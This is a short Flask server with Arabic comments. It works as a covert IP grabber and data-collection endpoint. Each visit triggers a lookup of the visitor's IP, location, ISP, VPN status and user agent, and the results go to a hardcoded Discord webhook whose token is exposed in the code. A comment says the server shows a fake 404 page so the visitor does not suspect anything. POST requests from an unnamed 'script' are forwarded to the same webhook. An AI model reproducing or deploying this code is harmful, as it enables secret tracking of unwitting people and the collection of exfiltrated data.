from flask import Flask, request, jsonify
import requests
import time

app = Flask(__name__)

# --- الإعدادات ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1475965729932050503/oSnlVaHFmJ8Xlcd7opMtU2YtJUsSytKTL2gS1GwhJGTPgM8xxQKXgbgObzaku3ovYis0"
COOLDOWN_SECONDS = 4
last_sent_time = 0

def get_detailed_geo(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,city,isp,proxy,hosting").json()
        return res
    except:
        return None

def send_to_discord(title, color, extra_data=None):
    global last_sent_time
    current_time = time.time()
    
    # الحصول على IP الزائر
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    geo = get_detailed_geo(ip)
    
    # تجهيز رسالة الديسكورد
    payload = {
        "embeds": [{
            "title": title,
            "color": color,
            "fields": [
                {"name": "🌐 الـ IP", "value": f"**{ip}**", "inline": True},
                {"name": "📍 الموقع", "value": f"{geo.get('country', 'Unknown')}/{geo.get('city', 'Unknown')}", "inline": True},
                {"name": "🛡️ VPN?", "value": "Yes" if geo and (geo.get('proxy') or geo.get('hosting')) else "No", "inline": True},
                {"name": "🏢 ISP", "value": f"`{geo.get('isp', 'Unknown')}`", "inline": False},
                {"name": "📱 الجهاز/المتصفح", "value": f"```\n{user_agent}\n```", "inline": False}
            ],
            "footer": {"text": f"التوقيت: {time.ctime()}"}
        }]
    }

    if extra_data:
        payload["embeds"][0]["fields"].append({"name": "📦 بيانات الـ POST", "value": f"```json\n{extra_data}\n```", "inline": False})

    requests.post(DISCORD_WEBHOOK_URL, json=payload)
    last_sent_time = current_time

# 1. لو أحد فتح الرابط في المتصفح (GET)
@app.route('/bridge', methods=['GET'])
def handle_get():
    send_to_discord("👀 شخص فتح الرابط (زيارة متصفح)", 3447003) # لون أزرق
    return "<h1>404 Not Found</h1>", 404 # نطلع له صفحة خطأ عشان ما يشك

# 2. لو السكربت أرسل ريكوست (POST)
@app.route('/bridge', methods=['POST'])
def handle_post():
    data = request.json or {}
    send_to_discord("🚀 ريكوست من السكربت (POST)", 16711680, extra_data=data) # لون أحمر
    return jsonify({"status": "ok"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
